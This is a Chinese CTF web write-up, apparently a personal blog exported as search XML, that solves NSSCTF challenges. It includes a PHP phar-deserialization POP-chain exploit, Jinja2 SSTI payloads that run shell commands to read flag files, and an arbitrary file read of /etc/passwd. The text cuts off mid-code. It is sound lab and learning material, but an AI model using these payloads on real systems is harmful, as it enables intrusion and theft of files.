<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NSS-web刷题</title>
      <link href="/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/"/>
      <url>/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>NSSCTF web 刷题，督促自己用的，图就不放了，好麻烦嘤嘤嘤</p><h2 id="SWPU-2018-SimplePHP"><a href="#SWPU-2018-SimplePHP" class="headerlink" title="[SWPU 2018]SimplePHP"></a>[SWPU 2018]SimplePHP</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129090655640.png" alt="image-20241129090655640" style="zoom: 80%;" /><p>一眼任意文件读取</p><p>获取目录下的文件</p><p><strong>index.php</strong></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129090754383.png" alt="image-20241129090754383"></p><p><strong>function.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123; </span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">upload_file_check</span>()) &#123; </span><br><span class="line">        <span class="title function_ invoke__">upload_file_do</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>class.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>base.php</strong></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129090905238.png" alt="image-20241129090905238"></p><p><strong>upload_file.php</strong></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129091157168.png" alt="image-20241129091157168"></p><p>然后我们需要进行的就是代码审计</p><p>上传的文件后缀限定为白名单，且会强制改成.jpg，那么正常的文件上传漏洞就不存在了，得想其他办法，源码中其实也给了提示，phar反序列化，给了文件包含的点，也给了文件上传的点，那么就可以利用phar反序列化了。那么接下来就要找链条了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C1e4r::__destruct() -&gt; Show::__toString() -&gt; Test::__get() -&gt; Test::get() -&gt; Test::file_get()</span><br></pre></td></tr></table></figure><p>链子拿捏了，构造就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;params[<span class="string">&#x27;source&#x27;</span>]=<span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="variable">$t</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;str=<span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//删除之前的test.phar文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>(); <span class="comment">//开始缓冲 Phar 写操作</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); <span class="comment">//设置stub，添加gif文件头</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); <span class="comment">//要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$c</span>);  <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>(); <span class="comment">////停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span></span><br></pre></td></tr></table></figure><p>然后将phar文件后缀改成jpg，上传后在upload目录下获取名称然后在file.php文件下进行phar文件包含即可获取flag</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129094525150.png" alt="image-20241129094525150"></p><h2 id="CISCN-2019华东南-Double-Secret"><a href="#CISCN-2019华东南-Double-Secret" class="headerlink" title="[CISCN 2019华东南]Double Secret"></a>[CISCN 2019华东南]Double Secret</h2><p>扫目录发现&#x2F;secret目录</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129152014405.png" alt="image-20241129152014405"></p><p>传入secret参数后会加密后进行回显，11111就报错了，同时发现泄露了部分源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#解密</span></span><br><span class="line">deS=rc.do_crypt(secret)</span><br><span class="line">a=render_template_string(safe(deS))</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> a</span><br></pre></td></tr></table></figure><p>一眼ssti</p><p>RC4加密后用render_template_string进行模板渲染，RC4密钥为HereIsTreasure，同时用safe()函数对恶意代码进行过滤</p><p>那接下来就试着ssti</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129153324392.png" alt="image-20241129153324392"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129153330890.png" alt="image-20241129153330890"></p><p>那就</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2]&#125;&#125;</span><br></pre></td></tr></table></figure><p>这样就能获得object了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129153602396.png" alt="image-20241129153602396"></p><p>然后不知道找哪个类了，网上说用warnings.catch_warnings类然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>但是我不太行啊，不知道为啥。</p><p>后来用config直接试，居然可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129154720280.png" alt="image-20241129154720280"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129154816344.png" alt="image-20241129154816344"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>NSSCTF{2503893c-a2dd-44f5-822d-40536acbabd0}</p><p>后来又回归之前的payload，用&lt;class ‘site._Printer’&gt;类里面的globals有os模块，是可以用的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>warnings.catch_warnings类有open模块，可以直接打开文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;open&#x27;](&#x27;/flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="TQLCTF-2022-simple-bypass"><a href="#TQLCTF-2022-simple-bypass" class="headerlink" title="[TQLCTF 2022]simple_bypass"></a>[TQLCTF 2022]simple_bypass</h2><p>注册登陆一下就好，在好康的处发现php的跳转，发现那里可能存在任意文件读取</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129162734692.png" alt="image-20241129162734692"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28995/get_pic.php?image=/etc/passwd</span><br></pre></td></tr></table></figure><p>然后查看源代码获取一串base64</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129162758249.png" alt="image-20241129162758249" style="zoom:67%;" /><p>实锤了！任意文件读取，那就读取一下当前的这个文件吧。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$image</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;image&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;img&quot;&gt; &lt;img src=&quot;data:image/png;base64,&#x27;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$image</span>)) . <span class="string">&#x27;&quot; /&gt; &lt;/div&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>没啥用，那就看看index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$hash_user</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line"><span class="variable">$hash_pass</span> = <span class="string">&#x27;zsf&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]))&#123;</span><br><span class="line"><span class="comment">//filter</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &gt; <span class="number">6</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Username is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span 